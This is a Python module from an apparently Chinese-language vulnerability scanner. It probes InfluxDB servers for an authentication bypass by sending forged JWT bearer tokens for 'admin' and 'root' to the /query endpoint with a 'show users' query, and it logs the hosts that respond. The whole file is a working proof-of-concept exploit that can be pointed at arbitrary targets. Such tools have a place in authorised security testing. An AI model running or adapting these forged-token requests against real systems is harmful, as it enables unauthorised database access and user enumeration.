#! /usr/bin/python3
# -*- coding: utf-8 -*-
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class InfluxDB_Wsq_SqlScan:
    def _scan(self, urls):
        url = urls + '/query'
        header = {
            "Host": urls.split("://")[-1],
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxOTk2MjM5MDIyfQ.xHUZG6BI83jf9T4_7UsUzyz7odjb-YXvsV9jgSLDmkg",
            "User-Agent": self.header,
        }
        data = "db=sample&q=show+users"
        try:
            response = requests.post(url=url, headers=header, data=data,verify=self.ssl, timeout=3, proxies=self.proxy)
            if response.status_code == 200:
                OutPrintInfoSuc("InfluxDB", f"存在InfluxDB-Sql {urls}")
                if self.batch:
                    OutPutFile("influxdb_wsq_sql.txt",f"存在InfluxDB-Sql {urls}")

            else:
                if not self.batch:
                    OutPrintInfo("InfluxDB", "不存在InfluxDB-Sql")
        except Exception as e:
            if not self.batch:
                OutPrintInfo("InfluxDB", "目标请求出错")
    def _scan2(self, urls):
        url = urls + '/query'
        header = {
            "Host": urls.split("://")[-1],
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InJvb3QiLCJleHAiOjE5OTYyMzkwMjJ9.L8RfoAT1Z8YfSERjTkDwggD2OIziyVe0Sgi_DXivTt0",
            "User-Agent": self.header,
        }
        data = "db=sample&q=show+users"
        try:
            response = requests.post(url=url, headers=header, data=data,verify=self.ssl, timeout=3, proxies=self.proxy)
            if response.status_code == 200:
                OutPrintInfoSuc("InfluxDB", f"存在InfluxDB-Sql {urls}")
                if self.batch:
                    OutPutFile("influxdb_wsq_sql.txt", f"存在InfluxDB-Sql {urls}")

            else:
                if not self.batch:
                    OutPrintInfo("InfluxDB", "不存在InfluxDB-Sql")
        except Exception as e:
            if not self.batch:
                OutPrintInfo("InfluxDB", "目标请求出错")


    def main(self, results):
        self.batch = results["batch_work"]
        url = results["url"].strip('/ ')
        self.ssl = results["ssl"]
        self.header = results["header"]
        proxy = results["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("InfluxDB","开始检测InfluxDB-Sql......")
            OutPrintInfo("InfluxDB", "开始检测InfluxDB-Sql-POC-1......")
        self._scan(url)
        if not self.batch:
            OutPrintInfo("InfluxDB", "开始检测InfluxDB-Sql-POC-2......")
        self._scan2(url)
        if not self.batch:
            OutPrintInfo("InfluxDB","InfluxDB-Sql检测结束")

